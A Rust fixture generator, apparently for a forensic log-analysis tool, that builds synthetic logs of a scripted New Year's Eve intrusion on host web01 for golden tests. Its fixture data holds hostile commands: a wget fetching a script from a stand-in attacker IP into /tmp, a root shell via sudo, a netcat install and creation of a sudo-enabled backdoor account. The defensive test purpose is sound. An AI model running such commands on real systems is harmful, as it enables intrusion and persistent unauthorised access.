//! Deterministic incident fixture generator.
//!
//! Produces a synthetic evidence tree for host `web01` (America/New_York,
//! EST in the incident window) with a documented ground-truth intrusion that
//! spans New Year's Eve, so recovering the story in the right order requires
//! both correct time-zone normalization (local-time logs vs. UTC epoch
//! artifacts) and correct year inference (`Dec 31` → `Jan  1` rollover).
//!
//! The story (local time, 2024-12-31 → 2025-01-01):
//!
//! 1. SSH brute force against `web01` from `203.0.113.45`.
//! 2. Password login as `deploy` from that new IP; recon commands; a script
//!    is downloaded to `/tmp/.x.sh` and made executable.
//! 3. `sudo /bin/bash` → root; `netcat-openbsd` installed.
//! 4. Backdoor account `sysbackup` created, given a password, added to `sudo`.
//! 5. Root crontab replaced to run `/tmp/.x.sh` at 00:05; deploy logs out.
//! 6. After midnight cron runs the script; `sysbackup` logs in by public key
//!    from `192.0.2.99`, reads `/etc/shadow` via sudo and shreds a rotated log.
//!
//! Everything is generated from a SplitMix64 PRNG with a fixed seed, so the
//! same options always yield byte-identical files (checked by a golden test
//! against the committed `fixtures/incident` tree).

use std::collections::BTreeMap;
use std::fmt::Write as _;
use std::fs;
use std::path::Path;

use chrono::{DateTime, Datelike, Duration, NaiveDate, Utc};
use serde::{Deserialize, Serialize};

use crate::error::{Error, Result};
use crate::event::{Event, EventKind};
use crate::parsers::journal::write_entry;
use crate::parsers::utmp::{UtmpRecord, ut_type};
use crate::time::TimeZone;
use crate::time::posix::PosixTz;
use crate::time::tzif::{LocalType, write_tzif_v2};

/// Host name of the fixture system.
pub const HOST: &str = "web01";
/// IANA name written to `etc/timezone`.
pub const ZONE_NAME: &str = "America/New_York";
/// POSIX rule embedded as the TZif footer.
pub const POSIX_RULE: &str = "EST5EDT,M3.2.0,M11.1.0";
/// Brute-force / initial-access source.
pub const ATTACKER_IP: &str = "203.0.113.45";
/// Backdoor login source.
pub const BACKDOOR_IP: &str = "192.0.2.99";
/// The administrator's usual source.
pub const ALICE_IP: &str = "198.51.100.7";
/// The deploy account's usual source.
pub const DEPLOY_IP: &str = "198.51.100.23";

/// Generator options.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct FixtureOptions {
    /// PRNG seed.
    pub seed: u64,
    /// Background-noise multiplier (1 = committed fixture).
    pub scale: u32,
}

impl Default for FixtureOptions {
    fn default() -> Self {
        FixtureOptions { seed: 1, scale: 1 }
    }
}

/// One ground-truth step of the story.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Step {
    /// Stable identifier (`S01`...).
    pub id: String,
    /// What happened.
    pub title: String,
    /// When, in UTC (RFC 3339, whole seconds).
    pub utc: String,
    /// When, in the host's local time (for humans).
    pub local: String,
    /// Expected normalized kind.
    pub kind: EventKind,
    /// Expected acting user.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    /// Expected field values.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub fields: BTreeMap<String, String>,
    /// Tag the default ruleset must attach.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tag: Option<String>,
}

impl Step {
    /// The step's instant.
    pub fn instant(&self) -> Option<DateTime<Utc>> {
        DateTime::parse_from_rfc3339(&self.utc)
            .ok()
            .map(|t| t.with_timezone(&Utc))
    }

    /// True when `e` is the event this step describes (same second, kind,
    /// user and fields). Tags are checked separately.
    pub fn matches(&self, e: &Event) -> bool {
        self.instant()
            .is_some_and(|t| e.ts.timestamp() == t.timestamp())
            && e.kind == self.kind
            && (self.user.is_none() || e.user == self.user)
            && self
                .fields
                .iter()
                .all(|(k, v)| e.get(k) == Some(v.as_str()))
    }
}

/// The documented ground truth.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct GroundTruth {
    /// Host name.
    pub host: String,
    /// Zone of local-time artifacts.
    pub timezone: String,
    /// One-paragraph summary.
    pub summary: String,
    /// Steps in chronological order.
    pub steps: Vec<Step>,
}

/// SplitMix64: tiny, fast, deterministic across platforms.
#[derive(Debug, Clone)]
pub struct Rng(u64);

impl Rng {
    /// Seeds the generator.
    pub fn new(seed: u64) -> Self {
        Rng(seed)
    }

    /// Next 64 random bits.
    pub fn next_u64(&mut self) -> u64 {
        self.0 = self.0.wrapping_add(0x9e37_79b9_7f4a_7c15);
        let mut z = self.0;
        z = (z ^ (z >> 30)).wrapping_mul(0xbf58_476d_1ce4_e5b9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94d0_49bb_1331_11eb);
        z ^ (z >> 31)
    }

    /// Uniform integer in `0..n` (n > 0).
    pub fn below(&mut self, n: u64) -> u64 {
        self.next_u64() % n.max(1)
    }

    /// Uniform integer in `lo..=hi`.
    pub fn range(&mut self, lo: i64, hi: i64) -> i64 {
        lo + self.below((hi - lo + 1) as u64) as i64
    }

    /// Picks an element.
    pub fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.below(items.len() as u64) as usize]
    }
}

const AUTH: u8 = 1;
const SYSLOG: u8 = 2;
const CRON: u8 = 4;

#[derive(Debug, Clone)]
struct LogRec {
    t: DateTime<Utc>,
    sub_us: u32,
    seq: usize,
    prog: String,
    pid: u32,
    uid: u32,
    msg: String,
    dest: u8,
    journal: bool,
}

struct Gen {
    tz: TimeZone,
    rng: Rng,
    scale: u32,
    logs: Vec<LogRec>,
    wtmp: Vec<UtmpRecord>,
    btmp: Vec<UtmpRecord>,
    utmp: Vec<UtmpRecord>,
    history: BTreeMap<&'static str, Vec<(i64, String)>>,
    dpkg: Vec<String>,
    apt: Vec<String>,
    body: Vec<(String, u64, String, u32, u64, [i64; 4])>,
    steps: Vec<Step>,
    pid: u32,
}

const MONTHS: [&str; 12] = [
    "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec",
];

impl Gen {
    fn new(opts: &FixtureOptions, tz: TimeZone) -> Self {
        Gen {
            tz,
            rng: Rng::new(opts.seed),
            scale: opts.scale.max(1),
            logs: Vec::new(),
            wtmp: Vec::new(),
            btmp: Vec::new(),
            utmp: Vec::new(),
            history: BTreeMap::new(),
            dpkg: Vec::new(),
            apt: Vec::new(),
            body: Vec::new(),
            steps: Vec::new(),
            pid: 1200,
        }
    }

    /// Local wall-clock time in the story window → UTC (December is 2024).
    fn lt(&self, month: u32, day: u32, h: u32, m: u32, s: u32) -> DateTime<Utc> {
        let year = if month == 12 { 2024 } else { 2025 };
        let local = NaiveDate::from_ymd_opt(year, month, day)
            .and_then(|d| d.and_hms_opt(h, m, s))
            .expect("story times are valid");
        self.tz.local_to_utc(local).utc
    }

    fn next_pid(&mut self) -> u32 {
        self.pid += 1 + self.rng.below(40) as u32;
        self.pid
    }

    #[allow(clippy::too_many_arguments)]
    fn log(&mut self, t: DateTime<Utc>, dest: u8, prog: &str, pid: u32, uid: u32, msg: &str) {
        let sub_us = self.rng.below(1_000_000) as u32;
        let seq = self.logs.len();
        self.logs.push(LogRec {
            t,
            sub_us,
            seq,
            prog: prog.to_string(),
            pid,
            uid,
            msg: msg.to_string(),
            dest,
            journal: true,
        });
    }

    fn auth(&mut self, t: DateTime<Utc>, prog: &str, pid: u32, msg: &str) {
        self.log(t, AUTH, prog, pid, 0, msg);
    }

    fn sys(&mut self, t: DateTime<Utc>, prog: &str, pid: u32, msg: &str) {
        self.log(t, SYSLOG, prog, pid, 0, msg);
    }

    fn cron(&mut self, t: DateTime<Utc>, prog: &str, pid: u32, msg: &str) {
        self.log(t, CRON | SYSLOG, prog, pid, 0, msg);
    }

    fn hist(&mut self, file: &'static str, t: DateTime<Utc>, cmd: &str) {
        self.history
            .entry(file)
            .or_default()
            .push((t.timestamp(), cmd.to_string()));
    }

    fn sudo(&mut self, t: DateTime<Utc>, user: &str, tty: &str, pwd: &str, cmd: &str) {
        let msg = format!("{user:>8} : TTY={tty} ; PWD={pwd} ; USER=root ; COMMAND={cmd}");
        self.auth(t, "sudo", 0, &msg);
        if cmd != "list" {
            let pid = self.next_pid();
            self.auth(
                t,
                "sudo",
                pid,
                &format!("pam_unix(sudo:session): session opened for user root(uid=0) by {user}(uid=1000)"),
            );
            self.auth(
                t + Duration::seconds(1),
                "sudo",
                pid,
                "pam_unix(sudo:session): session closed for user root",
            );
        }
    }

    fn utmp_rec(
        &mut self,
        t: DateTime<Utc>,
        ty: i16,
        line: &str,
        user: &str,
        host: &str,
    ) -> UtmpRecord {
        let mut r = UtmpRecord {
            ut_type: ty,
            pid: self.pid as i32,
            line: line.into(),
            id: line
                .rsplit('/')
                .next()
                .unwrap_or("")
                .chars()
                .take(4)
                .collect(),
            user: user.into(),
            host: host.into(),
            session: 0,
            tv_sec: t.timestamp() as i32,
            tv_usec: self.rng.below(1_000_000) as i32,
            ..UtmpRecord::default()
        };
        r.set_address(host);
        r
    }

    #[allow(clippy::too_many_arguments)]
    fn step(
        &mut self,
        id: &str,
        title: &str,
        t: DateTime<Utc>,
        kind: EventKind,
        user: Option<&str>,
        fields: &[(&str, &str)],
        tag: Option<&str>,
    ) {
        self.steps.push(Step {
            id: id.to_string(),
            title: title.to_string(),
            utc: t.format("%Y-%m-%dT%H:%M:%SZ").to_string(),
            local: self.tz.to_local(t).format("%Y-%m-%d %H:%M:%S").to_string(),
            kind,
            user: user.map(str::to_string),
            fields: fields
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            tag: tag.map(str::to_string),
        });
    }

    #[allow(clippy::too_many_arguments)]
    fn file(
        &mut self,
        path: &str,
        mode: &str,
        uid: u32,
        size: u64,
        m: i64,
        a: i64,
        c: i64,
        b: i64,
    ) {
        let inode = 131_072 + self.body.len() as u64 * 7 + self.rng.below(5);
        self.body.push((
            path.to_string(),
            inode,
            mode.to_string(),
            uid,
            size,
            [a, m, c, b],
        ));
    }

    fn ssh_login(
        &mut self,
        t: DateTime<Utc>,
        user: &str,
        ip: &str,
        method: &str,
        tty: &str,
        session: u32,
    ) -> u32 {
        let pid = self.next_pid();
        let port = 40_000 + self.rng.below(20_000) as u32;
        let key = if method == "publickey" {
            ": ED25519 SHA256:Zk3q9Xc4m2VwqL1sTn8fYp0rHb6uJd5aEe7gKi2oQx4"
        } else {
            ""
        };
        self.auth(
            t,
            "sshd",
            pid,
            &format!("Accepted {method} for {user} from {ip} port {port} ssh2{key}"),
        );
        self.auth(
            t,
            "sshd",
            pid,
            &format!("pam_unix(sshd:session): session opened for user {user}(uid=1000) by (uid=0)"),
        );
        self.auth(
            t,
            "systemd-logind",
            612,
            &format!("New session {session} of user {user}."),
        );
        let rec = self.utmp_rec(
            t + Duration::seconds(1),
            ut_type::USER_PROCESS,
            tty,
            user,
            ip,
        );
        self.wtmp.push(rec);
        port
    }

    fn ssh_logout(
        &mut self,
        t: DateTime<Utc>,
        user: &str,
        ip: &str,
        port: u32,
        tty: &str,
        session: u32,
    ) {
        let pid = self.next_pid();
        self.auth(
            t,
            "sshd",
            pid,
            &format!("Received disconnect from {ip} port {port}:11: disconnected by user"),
        );
        self.auth(
            t,
            "sshd",
            pid,
            &format!("Disconnected from user {user} {ip} port {port}"),
        );
        self.auth(
            t,
            "sshd",
            pid,
            &format!("pam_unix(sshd:session): session closed for user {user}"),
        );
        self.auth(
            t,
            "systemd-logind",
            612,
            &format!("Session {session} logged out. Waiting for processes to exit."),
        );
        self.auth(
            t,
            "systemd-logind",
            612,
            &format!("Removed session {session}."),
        );
        let rec = self.utmp_rec(t, ut_type::DEAD_PROCESS, tty, "", "");
        self.wtmp.push(rec);
    }

    fn baseline(&mut self) {
        let boot = self.lt(12, 28, 0, 0, 10);
        for target in 0..2 {
            let mut r = self.utmp_rec(boot, ut_type::BOOT_TIME, "~", "reboot", "6.8.0-49-generic");
            r.id = "~~".into();
            let mut lvl = self.utmp_rec(
                boot + Duration::seconds(9),
                ut_type::RUN_LVL,
                "~",
                "runlevel",
                "6.8.0-49-generic",
            );
            lvl.id = "~~".into();
            lvl.pid = i32::from(b'5');
            if target == 0 {
                self.wtmp.extend([r, lvl]);
            } else {
                self.utmp.extend([r, lvl]);
            }
        }
        self.sys(boot, "kernel", 0, "Linux version 6.8.0-49-generic (buildd@lcy02-amd64-103) (x86_64-linux-gnu-gcc-13) #49-Ubuntu SMP PREEMPT_DYNAMIC");
        for (i, unit) in [
            "ssh.service - OpenBSD Secure Shell server",
            "cron.service - Regular background program processing daemon",
            "rsyslog.service - System Logging Service",
            "webapp.service - Example web application",
        ]
        .iter()
        .enumerate()
        {
            self.sys(
                boot + Duration::seconds(3 + i as i64),
                "systemd",
                1,
                &format!("Started {unit}."),
            );
        }

        // Cron noise every 15 minutes, hourly and daily jobs.
        let start = self.lt(12, 28, 0, 15, 1);
        let end = self.lt(1, 1, 0, 45, 0);
        let mut t = start;
        let step = Duration::minutes(15 / i64::from(self.scale).clamp(1, 15));
        while t < end {
            let local = self.tz.to_local(t);
            let pid = self.next_pid();
            self.auth(
                t,
                "CRON",
                pid,
                "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
            );
            let cmd = if local.format("%M").to_string() == "15"
                && local.format("%H").to_string() == "06"
            {
                "test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }"
            } else if local.format("%M").to_string() == "15" {
                "cd / && run-parts --report /etc/cron.hourly"
            } else {
                "command -v debian-sa1 > /dev/null && debian-sa1 1 1"
            };
            self.cron(t, "CRON", pid, &format!("(root) CMD ({cmd})"));
            self.auth(
                t + Duration::seconds(1),
                "CRON",
                pid,
                "pam_unix(cron:session): session closed for user root",
            );
            t += step;
        }
        for day in 28..=31 {
            let t = self.lt(12, day, 6, 25, 3);
            self.sys(
                t,
                "systemd",
                1,
                "Starting logrotate.service - Rotate log files...",
            );
            self.sys(
                t + Duration::seconds(1),
                "systemd",
                1,
                "logrotate.service: Deactivated successfully.",
            );
        }

        // Internet background scanners (single attempts from many sources).
        let users = [
            "admin", "oracle", "ubuntu", "test", "pi", "git", "postgres", "user",
        ];
        for day in [28u32, 29, 30, 31] {
            for _ in 0..(6 * self.scale) {
                let h = self.rng.range(0, 21) as u32;
                let (m, sec) = (self.rng.range(0, 59) as u32, self.rng.range(0, 59) as u32);
                let t = self.lt(12, day, h, m, sec);
                let ip = format!(
                    "198.18.{}.{}",
                    self.rng.range(0, 255),
                    self.rng.range(1, 254)
                );
                let user = *self.rng.pick(&users);
                let pid = self.next_pid();
                let port = 30_000 + self.rng.below(30_000);
                self.auth(
                    t,
                    "sshd",
                    pid,
                    &format!("Invalid user {user} from {ip} port {port}"),
                );
                self.auth(
                    t + Duration::seconds(2),
                    "sshd",
                    pid,
                    &format!("Failed password for invalid user {user} from {ip} port {port} ssh2"),
                );
                self.auth(
                    t + Duration::seconds(3),
                    "sshd",
                    pid,
                    &format!("Connection closed by invalid user {user} {ip} port {port} [preauth]"),
                );
                let rec = self.utmp_rec(
                    t + Duration::seconds(2),
                    ut_type::LOGIN_PROCESS,
                    "ssh:notty",
                    user,
                    &ip,
                );
                self.btmp.push(rec);
            }
        }

        // alice: daily admin session from her usual IP.
        let zsh_cmds = [
            "uptime",
            "df -h",
            "journalctl -p err --since today",
            "systemctl status webapp",
            "free -m",
            "tail -n 50 /var/log/syslog",
            "ls -la /srv/webapp",
        ];
        for (i, day) in [28u32, 29, 30, 31].into_iter().enumerate() {
            let (m, sec) = (self.rng.range(0, 20) as u32, self.rng.range(0, 59) as u32);
            let t = self.lt(12, day, 9, m, sec);
            let session = 10 + i as u32;
            let port = self.ssh_login(t, "alice", ALICE_IP, "publickey", "pts/0", session);
            let mut c = t + Duration::seconds(20);
            for _ in 0..self.rng.range(3, 5) {
                let cmd = *self.rng.pick(&zsh_cmds);
                self.hist("home/alice/.zsh_history", c, cmd);
                c += Duration::seconds(self.rng.range(15, 90));
            }
            if day == 29 {
                self.hist("home/alice/.zsh_history", c, "sudo apt update");
                self.sudo(
                    c + Duration::seconds(1),
                    "alice",
                    "pts/0",
                    "/home/alice",
                    "/usr/bin/apt update",
                );
                c += Duration::seconds(40);
                self.hist("home/alice/.zsh_history", c, "sudo apt upgrade -y");
                self.sudo(
                    c + Duration::seconds(1),
                    "alice",
                    "pts/0",
                    "/home/alice",
                    "/usr/bin/apt upgrade -y",
                );
                let s = c + Duration::seconds(3);
                let e = s + Duration::seconds(21);
                self.apt_block(s, e, "apt upgrade -y", Some("alice (1000)"), &[("Upgrade", "openssl:amd64 (3.0.13-0ubuntu3.3, 3.0.13-0ubuntu3.4), libssl3t64:amd64 (3.0.13-0ubuntu3.3, 3.0.13-0ubuntu3.4)")]);
                let d = s + Duration::seconds(4);
                self.dpkg_line(d, "startup archives unpack");
                self.dpkg_line(
                    d,
                    "upgrade libssl3t64:amd64 3.0.13-0ubuntu3.3 3.0.13-0ubuntu3.4",
                );
                self.dpkg_line(
                    d,
                    "status half-configured libssl3t64:amd64 3.0.13-0ubuntu3.3",
                );
                self.dpkg_line(
                    d + Duration::seconds(2),
                    "upgrade openssl:amd64 3.0.13-0ubuntu3.3 3.0.13-0ubuntu3.4",
                );
                self.dpkg_line(d + Duration::seconds(5), "startup packages configure");
                self.dpkg_line(
                    d + Duration::seconds(5),
                    "configure openssl:amd64 3.0.13-0ubuntu3.4 <none>",
                );
                self.dpkg_line(
                    d + Duration::seconds(5),
                    "status installed openssl:amd64 3.0.13-0ubuntu3.4",
                );
                c += Duration::seconds(60);
            }
            let out = c + Duration::seconds(self.rng.range(600, 1500));
            self.ssh_logout(out, "alice", ALICE_IP, port, "pts/0", session);
        }

        // deploy: routine release on Dec 30 from the CI runner's IP.
        let t = self.lt(12, 30, 14, 2, 11);
        let port = self.ssh_login(t, "deploy", DEPLOY_IP, "password", "pts/1", 20);
        let mut c = t + Duration::seconds(15);
        for cmd in [
            "cd /srv/webapp",
            "git pull --ff-only",
            "sudo systemctl restart webapp",
            "systemctl status webapp --no-pager",
        ] {
            self.hist("home/deploy/.bash_history", c, cmd);
            if cmd.starts_with("sudo") {
                self.sudo(
                    c + Duration::seconds(1),
                    "deploy",
                    "pts/1",
                    "/srv/webapp",
                    "/usr/bin/systemctl restart webapp",
                );
                self.sys(
                    c + Duration::seconds(2),
                    "systemd",
                    1,
                    "Stopping webapp.service - Example web application...",
                );
                self.sys(
                    c + Duration::seconds(3),
                    "systemd",
                    1,
                    "Stopped webapp.service - Example web application.",
                );
                self.sys(
                    c + Duration::seconds(3),
                    "systemd",
                    1,
                    "Started webapp.service - Example web application.",
                );
            }
            c += Duration::seconds(self.rng.range(10, 40));
        }
        // A multi-line application message (journal-only; exercises binary export fields).
        let mut rec = LogRec {
            t: c,
            sub_us: 1,
            seq: self.logs.len(),
            prog: "webapp".into(),
            pid: 2211,
            uid: 33,
            msg: "Traceback (most recent call last):\n  File \"/srv/webapp/app.py\", line 41, in <module>\nConnectionRefusedError: [Errno 111] Connection refused".into(),
            dest: 0,
            journal: true,
        };
        rec.sub_us = self.rng.below(1_000_000) as u32;
        self.logs.push(rec);
        self.ssh_logout(
            c + Duration::seconds(300),
            "deploy",
            DEPLOY_IP,
            port,
            "pts/1",
            20,
        );

        // File-system noise: system binaries and configuration from earlier in the year.
        let base = self.lt(12, 28, 0, 0, 0).timestamp() - 330 * 86_400;
        for name in [
            "ls",
            "cat",
            "bash",
            "sudo",
            "ssh",
            "curl",
            "wget",
            "python3",
            "systemctl",
            "journalctl",
            "apt",
            "dpkg",
            "crontab",
            "useradd",
            "passwd",
            "usermod",
            "tar",
            "gzip",
            "grep",
            "sed",
        ] {
            let t = base + self.rng.range(0, 150 * 86_400);
            let a = self.lt(12, 28, 0, 0, 0).timestamp() + self.rng.range(0, 86_400 * 3);
            let size = 10_000 + self.rng.below(900_000);
            self.file(
                &format!("/usr/bin/{name}"),
                "r/rrwxr-xr-x",
                0,
                size,
                t,
                a,
                t,
                t,
            );
        }
        for i in 0..(30 * self.scale) {
            let t = base + self.rng.range(0, 250 * 86_400);
            let size = 1_000 + self.rng.below(50_000);
            self.file(
                &format!("/usr/share/doc/pkg{i:03}/changelog.gz"),
                "r/rrw-r--r--",
                0,
                size,
                t,
                t,
                t,
                t,
            );
        }
        let t = self.lt(12, 30, 14, 3, 0).timestamp();
        self.file(
            "/srv/webapp/app.py",
            "r/rrw-r--r--",
            1001,
            4_211,
            t,
            t + 140,
            t,
            base,
        );
    }

    fn dpkg_line(&mut self, t: DateTime<Utc>, rest: &str) {
        let local = self.tz.to_local(t);
        self.dpkg
            .push(format!("{} {rest}", local.format("%Y-%m-%d %H:%M:%S")));
    }

    fn apt_block(
        &mut self,
        s: DateTime<Utc>,
        e: DateTime<Utc>,
        cmd: &str,
        by: Option<&str>,
        lists: &[(&str, &str)],
    ) {
        let fmt = |t: DateTime<Utc>| self.tz.to_local(t).format("%Y-%m-%d  %H:%M:%S").to_string();
        let mut b = format!("Start-Date: {}\nCommandline: {cmd}\n", fmt(s));
        if let Some(by) = by {
            let _ = writeln!(b, "Requested-By: {by}");
        }
        for (k, v) in lists {
            let _ = writeln!(b, "{k}: {v}");
        }
        let _ = writeln!(b, "End-Date: {}", fmt(e));
        self.apt.push(b);
    }

    fn attack(&mut self) {
        // S01/S02: brute force.
        let mut t = self.lt(12, 31, 23, 2, 10);
        let attempts: [(&str, bool); 12] = [
            ("root", false),
            ("root", false),
            ("admin", true),
            ("root", false),
            ("test", true),
            ("deploy", false),
            ("root", false),
            ("ubuntu", true),
            ("deploy", false),
            ("admin", true),
            ("root", false),
            ("deploy", false),
        ];
        let mut matching: Vec<DateTime<Utc>> = Vec::new();
        for (i, (user, invalid)) in attempts.iter().enumerate() {
            let pid = self.next_pid();
            let port = 51_000 + i as u32 * 7;
            if *invalid {
                self.auth(
                    t,
                    "sshd",
                    pid,
                    &format!("Invalid user {user} from {ATTACKER_IP} port {port}"),
                );
                matching.push(t);
                t += Duration::seconds(2);
                self.auth(t, "sshd", pid, &format!("Failed password for invalid user {user} from {ATTACKER_IP} port {port} ssh2"));
            } else {
                self.auth(t, "sshd", pid, &format!("pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ATTACKER_IP}  user={user}"));
                t += Duration::seconds(2);
                self.auth(
                    t,
                    "sshd",
                    pid,
                    &format!("Failed password for {user} from {ATTACKER_IP} port {port} ssh2"),
                );
            }
            matching.push(t);
            if i == 0 {
                self.step(
                    "S01",
                    "SSH brute force begins: first failed password from the attacker",
                    t,
                    EventKind::SshLoginFailure,
                    Some(user),
                    &[("src_ip", ATTACKER_IP)],
                    None,
                );
            }
            let rec = self.utmp_rec(t, ut_type::LOGIN_PROCESS, "ssh:notty", user, ATTACKER_IP);
            self.btmp.push(rec);
            self.auth(
                t + Duration::seconds(1),
                "sshd",
                pid,
                &format!(
                    "Connection closed by {}{user} {ATTACKER_IP} port {port} [preauth]",
                    if *invalid {
                        "invalid user "
                    } else {
                        "authenticating user "
                    }
                ),
            );
            t += Duration::seconds(self.rng.range(8, 14));
        }
        let fifth = matching[4];
        self.step(
            "S02",
            "Brute-force threshold crossed (5 failures from one IP within 5 minutes)",
            fifth,
            EventKind::SshLoginFailure,
            None,
            &[("src_ip", ATTACKER_IP)],
            Some("ssh-bruteforce"),
        );

        // S03/S04: successful login as deploy from the new IP.
        let t = self.lt(12, 31, 23, 7, 12);
        let pid = self.next_pid();
        self.auth(
            t,
            "sshd",
            pid,
            &format!("Accepted password for deploy from {ATTACKER_IP} port 50122 ssh2"),
        );
        self.step(
            "S03",
            "Password login as deploy from an IP never seen for that account",
            t,
            EventKind::SshLoginSuccess,
            Some("deploy"),
            &[("src_ip", ATTACKER_IP)],
            Some("ssh-new-ip"),
        );
        self.auth(
            t,
            "sshd",
            pid,
            "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
        );
        self.auth(t, "systemd-logind", 612, "New session 31 of user deploy.");
        let rec = self.utmp_rec(
            t + Duration::seconds(1),
            ut_type::USER_PROCESS,
            "pts/1",
            "deploy",
            ATTACKER_IP,
        );
        self.wtmp.push(rec);
        self.step(
            "S04",
            "wtmp records the interactive session on pts/1",
            t + Duration::seconds(1),
            EventKind::Login,
            Some("deploy"),
            &[("tty", "pts/1"), ("src_ip", ATTACKER_IP)],
            None,
        );

        // S05-S08: recon and payload staging.
        let bash = "home/deploy/.bash_history";
        let recon = self.lt(12, 31, 23, 8, 5);
        self.hist(bash, recon, "id");
        self.step(
            "S05",
            "Reconnaissance: deploy runs `id`",
            recon,
            EventKind::ShellCommand,
            Some("deploy"),
            &[("command", "id")],
            None,
        );
        self.hist(bash, self.lt(12, 31, 23, 8, 20), "uname -a");
        self.hist(bash, self.lt(12, 31, 23, 8, 41), "cat /etc/passwd");
        let wget = "wget -q http://203.0.113.45/x.sh -O /tmp/.x.sh";
        let t = self.lt(12, 31, 23, 9, 2);
        self.hist(bash, t, wget);
        self.step(
            "S06",
            "Payload downloaded into /tmp",
            t,
            EventKind::ShellCommand,
            Some("deploy"),
            &[("command", wget)],
            Some("download"),
        );
        let born = self.lt(12, 31, 23, 9, 3);
        self.step(
            "S07",
            "File system: hidden script /tmp/.x.sh is born",
            born,
            EventKind::FileActivity,
            None,
            &[("path", "/tmp/.x.sh"), ("macb", "M..B")],
            Some("file.temp-hidden"),
        );
        let chmod = self.lt(12, 31, 23, 9, 30);
        self.hist(bash, chmod, "chmod +x /tmp/.x.sh");
        self.step(
            "S08",
            "Payload made executable",
            chmod,
            EventKind::ShellCommand,
            Some("deploy"),
            &[("command", "chmod +x /tmp/.x.sh")],
            Some("temp-exec"),
        );
        let cron_exec = self.lt(1, 1, 0, 5, 1);
        self.file(
            "/tmp/.x.sh",
            "r/rrwxr-xr-x",
            1001,
            1_337,
            born.timestamp(),
            cron_exec.timestamp(),
            chmod.timestamp() + 1,
            born.timestamp(),
        );

        // S09: sudo -l then root shell.
        let t = self.lt(12, 31, 23, 10, 1);
        self.hist(bash, t, "sudo -l");
        self.sudo(
            t + Duration::seconds(1),
            "deploy",
            "pts/1",
            "/home/deploy",
            "list",
        );
        let t = self.lt(12, 31, 23, 10, 43);
        self.hist(bash, t, "sudo /bin/bash");
        let t = t + Duration::seconds(1);
        self.sudo(t, "deploy", "pts/1", "/home/deploy", "/bin/bash");
        self.step(
            "S09",
            "deploy escalates: sudo /bin/bash (root shell)",
            t,
            EventKind::SudoCommand,
            Some("deploy"),
            &[("target_user", "root"), ("command", "/bin/bash")],
            Some("root-shell"),
        );

        // S10/S11: tooling.
        let root = "root/.bash_history";
        let t = self.lt(12, 31, 23, 11, 30);
        self.hist(root, t, "apt-get install -y netcat-openbsd");
        let s = t + Duration::seconds(1);
        self.apt_block(
            s,
            s + Duration::seconds(4),
            "apt-get install -y netcat-openbsd",
            None,
            &[("Install", "netcat-openbsd:amd64 (1.226-1ubuntu2)")],
        );
        self.step(
            "S10",
            "APT transaction installs netcat-openbsd",
            s,
            EventKind::PackageTransaction,
            None,
            &[("install", "netcat-openbsd")],
            Some("tool-install"),
        );
        let d = s + Duration::seconds(2);
        self.dpkg_line(d, "startup archives unpack");
        self.dpkg_line(d, "install netcat-openbsd:amd64 <none> 1.226-1ubuntu2");
        self.step(
            "S11",
            "dpkg unpacks netcat-openbsd",
            d,
            EventKind::PackageInstall,
            None,
            &[("package", "netcat-openbsd")],
            Some("tool-install"),
        );
        self.dpkg_line(
            d,
            "status half-installed netcat-openbsd:amd64 1.226-1ubuntu2",
        );
        self.dpkg_line(d + Duration::seconds(1), "startup packages configure");
        self.dpkg_line(
            d + Duration::seconds(1),
            "configure netcat-openbsd:amd64 1.226-1ubuntu2 <none>",
        );
        self.dpkg_line(
            d + Duration::seconds(1),
            "status installed netcat-openbsd:amd64 1.226-1ubuntu2",
        );
        self.file(
            "/usr/bin/nc.openbsd",
            "r/rrwxr-xr-x",
            0,
            35_208,
            d.timestamp() - 86_400 * 200,
            d.timestamp(),
            d.timestamp(),
            d.timestamp(),
        );

        // S12-S14: backdoor account.
        let t = self.lt(12, 31, 23, 13, 4);
        self.hist(root, t, "useradd -m -s /usr/bin/fish sysbackup");
        let t = t + Duration::seconds(1);
        let pid = self.next_pid();
        self.auth(t, "useradd", pid, "new group: name=sysbackup, GID=1002");
        self.auth(t, "useradd", pid, "new user: name=sysbackup, UID=1002, GID=1002, home=/home/sysbackup, shell=/usr/bin/fish, from=/dev/pts/1");
        self.step(
            "S12",
            "Backdoor account sysbackup created",
            t,
            EventKind::UserCreated,
            None,
            &[("account", "sysbackup")],
            Some("new-user"),
        );
        let ts = t.timestamp();
        self.file(
            "/etc/passwd",
            "r/rrw-r--r--",
            0,
            2_011,
            ts,
            ts,
            ts,
            ts - 200 * 86_400,
        );
        self.file(
            "/etc/group",
            "r/rrw-r--r--",
            0,
            921,
            ts,
            ts,
            ts,
            ts - 200 * 86_400,
        );
        self.file(
            "/home/sysbackup",
            "d/drwxr-x---",
            1002,
            4_096,
            ts,
            ts,
            ts,
            ts,
        );
        let t = self.lt(12, 31, 23, 13, 30);
        self.hist(root, t, "passwd sysbackup");
        let t = self.lt(12, 31, 23, 13, 41);
        self.auth(
            t,
            "passwd",
            self.pid + 3,
            "pam_unix(passwd:chauthtok): password changed for sysbackup",
        );
        self.step(
            "S13",
            "Password set for sysbackup",
            t,
            EventKind::PasswordChanged,
            None,
            &[("account", "sysbackup")],
            Some("account-change"),
        );
        self.file(
            "/etc/shadow",
            "r/rrw-r-----",
            0,
            1_390,
            t.timestamp(),
            t.timestamp(),
            t.timestamp(),
            ts - 200 * 86_400,
        );
        let t = self.lt(12, 31, 23, 14, 9);
        self.hist(root, t, "usermod -aG sudo sysbackup");
        let t = t + Duration::seconds(1);
        let pid = self.next_pid();
        self.auth(t, "usermod", pid, "add 'sysbackup' to group 'sudo'");
